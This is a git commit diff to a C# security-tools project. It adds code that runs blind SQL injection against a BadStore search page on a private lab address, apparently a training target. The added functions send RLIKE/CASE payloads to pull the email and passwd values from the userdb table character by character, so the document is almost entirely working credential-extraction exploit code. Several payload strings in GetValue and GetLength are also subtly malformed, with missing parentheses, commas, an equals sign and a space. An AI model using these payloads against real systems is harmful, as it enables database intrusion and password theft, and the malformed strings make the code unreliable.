a55600531c22d2700eb43ba957be2f4798a1fb65
Endcat <1013387275@qq.com>
2019-06-29 22:00:25 +0800

    get db values

--- CsharpSecurityTools/CsharpSecurityTools/Program.cs
+++ CsharpSecurityTools/CsharpSecurityTools/Program.cs
@@ -207,7 +207,6 @@ namespace CsharpSecurityTools
 
           // Get rows of database
 
-
           private static string MakeRequest(string payload)
           {
                string url = "http://192.168.241.128/cgi-bin/badstore.cgi?action=search&searchquery=";
@@ -256,6 +255,87 @@ namespace CsharpSecurityTools
 
                int count = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
                Console.WriteLine("There are "+count+" rows in the userdb table");
+          }
+
+          private static int GetLength(int row, string column)
+          {
+               int countLength = 0;
+               for (; ;countLength++ )
+               {
+                    string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";
+                    getCountLength += " LENGTH(IFNULL(CAST(CHAR_LENGTH(" + column + ") AS";
+                    getCountLength += " CHAR),0x20)) FROM userdb ORDER BY email LIMIT";
+                    getCountLength += row + ",1)=" + countLength + ") THEN 0x28 ELSE 0x41 END)) AND";
+                    getCountLength += " 'YIye'='YIye";
+
+                    string response = MakeRequest(getCountLength);
+
+                    if (response.Contains("parentheses not balanced"))
+                              break;
+
+               }
+
+               List<byte> countBytes = new List<byte>();
+               for (int i = 0; i<= countLength; i++)
+               {
+                    for (int c = 48; c <= 58; c++)
+                    {
+                         string getLength = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
+                         getLength += " IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),0x20) FROM";
+                         getLength += " userdb ORDER BY email LIMIT " + row + ",1)," + i;
+                         getLength += ",1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye";
+                         string response = MakeRequest(getLength);
+                         if (response.Contains("parentheses not balanced"))
+                         {
+                              countBytes.Add((byte)c);
+                              break;
+                         }
+                    }
+               }
+               if (countBytes.Count > 0)
+                    return int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
+               else
+                    return 0;
+          }
+
+          private static string GetValue(int row, string column, int length)
+          {
+               List<byte> valBytes = new List<byte>();
+               for (int i = 0; i <= length; i++)
+               {
+                    for (int c = 32; c<=126;c++)
+                    {
+                         string getChar = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
+                         getChar += " IFNULL(CAST(" + column + " AS CHAR),0x20 FROM userdb ORDER BY";
+                         getChar += " email LIMIT " + row + ",1)" + i + ",1))" + c + ") THEN 0x28 ELSE 0x41";
+                         getChar += " END)) AND 'YIye'='YIye";
+                         string response = MakeRequest(getChar);
+
+                         if (response.Contains("parentheses not balanced"))
+                         {
+                              valBytes.Add((byte)c);
+                              break;
+                         }
+                    }
+               }
+               return Encoding.ASCII.GetString(valBytes.ToArray());
+          }
+
+          static void PrintValue(int count)
+          {
+               for (int row = 0; row<count; row++)
+               {
+                    foreach (string column in new string[] { "email", "passwd" })
+                    {
+                         Console.Write("Getting length of query value... ");
+                         int valLength = GetLength(row, column);
+                         Console.WriteLine(valLength);
+
+                         Console.Write("Getting Value... ");
+                         string value = GetValue(row, column, valLength);
+                         Console.WriteLine(value);
+                    }
+               }
           }
 
           static void Main(string[] args)
